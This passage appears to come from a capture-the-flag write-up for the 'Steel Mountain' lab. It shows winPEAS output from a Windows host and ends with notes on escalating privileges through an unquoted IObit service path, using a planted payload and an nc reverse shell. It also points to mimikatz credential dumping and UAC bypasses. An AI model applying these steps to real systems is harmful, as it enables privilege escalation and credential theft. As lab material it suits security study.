=========|| Antivirus Detection (attemping to read exclusions as well)

=========|| NET ACCOUNTS Info
Force user logoff how long after time expires?:       Never
Minimum password age (days):                          0
Maximum password age (days):                          42
Minimum password length:                              0
Length of password history maintained:                None
Lockout threshold:                                    Never
Lockout duration (minutes):                           30
Lockout observation window (minutes):                 30
Computer role:                                        SERVER
The command completed successfully.


=========|| REGISTRY SETTINGS CHECK

=========|| Audit Log Settings
No Audit Log settings, no registry entry found.

=========|| Windows Event Forward (WEF) registry
Logs are not being fowarded, no registry entry found.

=========|| LAPS Check
LAPS dlls not found on this machine

=========|| WDigest Check
The system was unable to find the specified registry value: UesLogonCredential

=========|| LSA Protection Check
The system was unable to find the specified registry value: RunAsPPL / RunAsPPLBoot

=========|| Credential Guard Check
The system was unable to find the specified registry value: LsaCfgFlags

=========|| Cached WinLogon Credentials Check
Get-ItemProperty : Property CACHEDLOGONSCOUNT does not exist at path 
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon.
At C:\temp\winpeas.ps1:716 char:4
+   (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows 
NT\CurrentVersion\Winlogon ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~
    + CategoryInfo          : InvalidArgument: (CACHEDLOGONSCOUNT:String) [Get 
   -ItemProperty], PSArgumentException
    + FullyQualifiedErrorId : System.Management.Automation.PSArgumentException 
   ,Microsoft.PowerShell.Commands.GetItemPropertyCommand

However, only the SYSTEM user can view the credentials here: HKEY_LOCAL_MACHINE\SECURITY\Cache
Or, using mimikatz lsadump::cache

=========|| Additonal Winlogon Credentials Check



=========|| RDCMan Settings Check
No RCDMan.Settings found.

=========|| RDP Saved Connections Check
HK_Users

Not found for HKEY_USERS\.DEFAULT
Not found for HKEY_USERS\S-1-5-21-3029548963-3893655183-1231094572-1001
Not found for HKEY_USERS\S-1-5-21-3029548963-3893655183-1231094572-1001_Classes
Not found for HKEY_USERS\S-1-5-18
HKCU
Terminal Server Client not found in HCKU

=========|| Putty Stored Credentials Check
No putty credentials found in HKCU:\SOFTWARE\SimonTatham\PuTTY\Sessions

=========|| SSH Key Checks

=========|| If found:
https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/

=========|| Checking Putty SSH KNOWN HOSTS
No putty ssh keys found

=========|| Checking for OpenSSH Keys
No OpenSSH Keys found.

=========|| Checking for WinVNC Passwords
No WinVNC found.

=========|| Checking for SNMP Passwords
SNMP Key found at HKLM:\SYSTEM\CurrentControlSet\Services\SNMP

=========|| Checking for TightVNC Passwords
No TightVNC found.

=========|| UAC Settings
EnableLUA is equal to 1. Part or all of the UAC components are on.
https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#basic-uac-bypass-full-file-system-access

=========|| Recently Run Commands (WIN+R)

=========||HKCU Recently Run Commands

=========|| Always Install Elevated Check
Checking Windows Installer Registry (will populate if the key exists)

=========|| PowerShell Info
PowerShell 2.0 available
PowerShell 4.0 available

=========|| PowerShell Registry Transcript Check

=========|| PowerShell Module Log Check

=========|| PowerShell Script Block Log Check

=========|| WSUS check for http and UseWAServer = 1, if true, might be vulnerable to exploit
https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#wsus

=========|| Internet Settings HKCU / HKLM
User Agent - Mozilla/4.0 (compatible; MSIE 8.0; Win32)
IE5_UA_Backup_Flag - 5.0
ZonesSecurityUpgrade - 2 196 0 179 35 117 213 1
EmailName - User@
AutoConfigProxy - wininet.dll
MimeExclusionListForCache - multipart/mixed multipart/x-mixed-replace multipart/x-byteranges 
WarnOnPost - 1 0 0 0
UseSchannelDirectly - 1 0 0 0
EnableHttp1_1 - 1
UrlEncoding - 0
SecureProtocols - 2720
PrivacyAdvanced - 0
DisableCachingOfSSLPages - 1
WarnonZoneCrossing - 1
CertificateRevocation - 1
EnableNegotiate - 1
MigrateProxy - 1
ProxyEnable - 0
CodeBaseSearchPath - CODEBASE
WarnOnIntranet - 1
EnablePunycode - 1
MinorVersion - 0
ActiveXCache - C:\Windows\Downloaded Program Files

=========|| RUNNING PROCESSES

=========|| Checking user permissions on running processes
Identity STEELMOUNTAIN\bill has 'FullControl' perms for C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\hfs.exe
STEELMOUNTAIN\bill has ownership of C:\Users\Public\nc.exe
Identity STEELMOUNTAIN\bill has 'FullControl' perms for C:\Users\Public\nc.exe

=========|| System processes

Image Name                     PID Session Name        Session#    Mem Usage Status          User Name                                              CPU Time Window Title                                                            
========================= ======== ================ =========== ============ =============== ================================================== ================================================================================
System Idle Process              0 Services                   0          4 K Unknown         NT AUTHORITY\SYSTEM                                     1:0N/A                                                                     

=========|| SERVICE path vulnerable check
Checking for vulnerable service .exe
LiveUpdateSvc found with permissions issue:
Identity STEELMOUNTAIN\bill has 'Write' perms for C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
AdvancedSystemCareService9 found with permissions issue:
Identity STEELMOUNTAIN\bill has 'Write' perms for C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
IObitUnSvr found with permissions issue:
Identity STEELMOUNTAIN\bill has 'Write' perms for C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe

=========|| Checking for Unquoted Service Paths
Fetching the list of services, this may take a while...
Unquoted Service Path found!
Name: AdvancedSystemCareService9
PathName: C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
StartName: LocalSystem
StartMode: Auto
Running: Running
Unquoted Service Path found!
Name: AWSLiteAgent
PathName: C:\Program Files\Amazon\XenTools\LiteAgent.exe
StartName: LocalSystem
StartMode: Auto
Running: Running
Unquoted Service Path found!
Name: IObitUnSvr
PathName: C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
StartName: LocalSystem
StartMode: Auto
Running: Stopped
Unquoted Service Path found!
Name: LiveUpdateSvc
PathName: C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
StartName: LocalSystem
StartMode: Auto
Running: Running

^C
```

- Found **AdvancedSystemCareService9** is in **Unquoted Service Paths** which can be exploited by creating payload Advanced.exe (as we did in above)
- And restart the service, then you get revershell in nc
